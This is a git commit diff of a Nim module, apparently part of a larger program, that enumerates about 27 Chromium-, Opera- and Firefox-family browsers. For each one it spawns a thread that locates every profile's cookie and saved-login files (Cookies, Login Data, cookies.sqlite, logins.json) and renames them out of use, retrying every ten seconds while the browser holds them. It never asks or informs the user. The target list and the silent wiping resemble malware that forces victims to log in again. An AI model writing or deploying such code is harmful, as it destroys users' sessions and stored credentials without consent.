b707ee71a447644e53e4b2657acea8029ef55fc1
vieru <mixerandr3w001@gmail.com>
2020-08-01 20:21:21 +0300

    am terminat, cred, browserthread, mai trb implementat in program, candva

--- src/lib/threads/browserThread.nim
+++ src/lib/threads/browserThread.nim
@@ -4,6 +4,7 @@ from os import getEnv
 from os import walkDir
 from os import PathComponent
 from os import existsDir
+from os import existsFile
 
 from strutils import startsWith
 
@@ -18,10 +19,71 @@ type
   BROWSER_TYPES = enum
     CHROME_BASED
     OPERA_BASED # still CHROME_BASED but uses a diferent file structure
+    FIREFOX_BASED
+  browserType = tuple[based: BROWSER_TYPES, folders: seq[string]]
+  browserThreadArgs = tuple[
+    based: BROWSER_TYPES,
+    folder: string,
+    appdata: string,
+    localappdata: string
+  ]
+  browserThreadType = Thread[browserThreadArgs]
 
+
+const browsers: seq[browserType] = @[
+  (
+    CHROME_BASED,
+    @[
+      r"Google\Chrome",
+      r"Microsoft\Edge",
+      r"7Star\7Star",
+      r"Amigo",
+      r"BraveSoftware\Brave-Browser",
+      r"CentBrowser",
+      r"Chedot",
+      r"Google\Chrome SxS",
+      r"Chromium",
+      r"CocCoc\Browser",
+      r"Comodo\Dragon",
+      r"Elements Browser",
+      r"Epic Privacy Browser",
+      r"Kometa",
+      r"Orbitum",
+      r"Sputnik\Sputnik",
+      r"Torch",
+      r"uCozMedia\Uran",
+      r"Vivaldi",
+      r"Yandex\YandexBrowse"
+    ]
+  ),
+  (
+    OPERA_BASED,
+    @[
+      r"Opera Software\Opera Stable"
+    ]
+  ),
+  (
+    FIREFOX_BASED,
+    @[
+      r"Mozilla\Firefox\Profiles",
+      r"NETGATE Technologies\BlackHawk",
+      r"8pecxstudios\Cyberfox",
+      r"Comodo\IceDragon",
+      r"K-Meleon,",
+      r"Mozilla\icecat"
+    ]
+  ),
+]
+
+proc getNoOfThreads(): int =
+  for b in browsers:
+    for f in b.folders:
+      result += 1
+
+const noOfThreads: int = getNoOfThreads()
 
 proc removeFileOrSleep(src: string, doSleep: bool = false): void =
-  const sleepTime: int = 10
+  const sleepTime: int = 10 # 10 secs
 
   if doSleep:
     sleep(sleepTime * 1000)
@@ -36,91 +98,74 @@ proc removeFileOrSleep(src: string, doSleep: bool = false): void =
       moveFile(src, src & "_")
     except OSError:
       removeFileOrSleep(src, true)
-  # chit ca nu exista fisierul
-  # worked va fi true
+
   if not worked:
     # try to remove file every `sleepTime` secs
     # am nev de asta pt ca daca browserul este deschis
     # nu pot sterge fisierul
     removeFileOrSleep(src, true)
 
+proc initSearchThread(args: browserThreadArgs): void {.thread.} =
+  let (based, folder, appdata, localappdata) = args
+
+  var
+    fullFolder: string = ""
+    files: seq[string] = @[]
+
+  case based
+  of CHROME_BASED, OPERA_BASED:
+    let isOpera: bool = based == OPERA_BASED
+
+    fullFolder =
+      if isOpera:
+        appdata / folder
+      else:
+        localappdata / folder / "User Data"
+
+    if existsDir(fullFolder):
+      # add default user data
+      files.add r"Default\Cookies"
+      files.add r"Default\Login Data"
+
+      for kind, maybeProfile in walkDir(fullFolder, true):
+        if kind == pcDir:
+          # if maybeProfile is a profile
+          if maybeProfile.startsWith("Profile"):
+            # maybeProfile is now for sure a profile
+            files.add maybeProfile / "Cookies"
+            files.add maybeProfile / "Login Data"
+
+  of FIREFOX_BASED:
+    fullFolder = appdata / folder
+
+    if existsDir(fullFolder):
+      for kind, profile in walkDir(fullFolder, true):
+        if kind == pcDir:
+          files.add profile / "cookies.sqlite"
+          files.add profile / "logins.json"
+
+  for file in files:
+    let fullPath: string = fullFolder / file
+
+    if existsFile(fullPath):
+      # echo fullPath
+      removeFileOrSleep(fullPath)
+
+
 proc initBrowserThread*(): void {.thread.} =
-  # trebuie mai multe browsere
-  let browsers: seq[tuple[based: BROWSER_TYPES, folders: seq[string]]] = @[
-    (
-      CHROME_BASED,
-      @[
-        r"Google\Chrome",
-        r"Microsoft\Edge",
-        r"7Star\7Star",
-        r"Amigo",
-        r"BraveSoftware\Brave-Browser",
-        r"CentBrowser",
-        r"Chedot",
-        r"Google\Chrome SxS",
-        r"Chromium",
-        r"CocCoc\Browser",
-        r"Comodo\Dragon",
-        r"Elements Browser",
-        r"Epic Privacy Browser",
-        r"Kometa",
-        r"Orbitum",
-        r"Sputnik\Sputnik",
-        r"Torch",
-        r"uCozMedia\Uran",
-        r"Vivaldi",
-        r"Yandex\YandexBrowse"
-      ]
-    ),
-    (
-      OPERA_BASED,
-      @[
-        r"Opera Software\Opera Stable"
-      ]
-    ),
-  ]
+  let
+    appdata: string = getEnv("appdata")
+    localappdata: string = getEnv("localappdata")
 
-  # cache prefix to avoid multiple getEnv calls
-  var prefix: string = ""
-
+  var
+    threads: seq[browserThreadType] = newSeq[browserThreadType](noOfThreads)
+    i = 0
   for browser in browsers:
-    # clear prefix for diferent browser types
-    prefix = ""
     for folder in browser.folders:
-      var
-        fullFolder: string = ""
-        files: seq[string] = @[]
-      case browser.based
+      createThread(threads[i], initSearchThread, (browser.based,
+          folder, appdata, localappdata))
+      i += 1
 
-      of CHROME_BASED, OPERA_BASED:
-        let isOpera: bool = browser.based == OPERA_BASED
-
-        # check if prefix is already assigned
-        if prefix == "":
-          prefix =
-            # opera uses appdata instead of localappdata
-            if isOpera:
-              getEnv("appdata")
-            else:
-              getEnv("localappdata")
-
-        fullFolder =
-          if isOpera:
-            prefix / folder
-          else:
-            prefix / folder / "User Data"
-
-        if existsDir(fullFolder):
-          files = @[r"Default\Cookies", r"Default\Login Data"]
-
-          for kind, folder in walkDir(fullFolder, true):
-            if kind == pcDir:
-              if folder.startsWith("Profile"):
-                files.add folder / "Cookies"
-                files.add folder / "Login Data"
-
-      for file in files:
-        # echo file
-        removeFileOrSleep(fullFolder / file)
+  joinThreads(threads)
 
 # initBrowserThread()
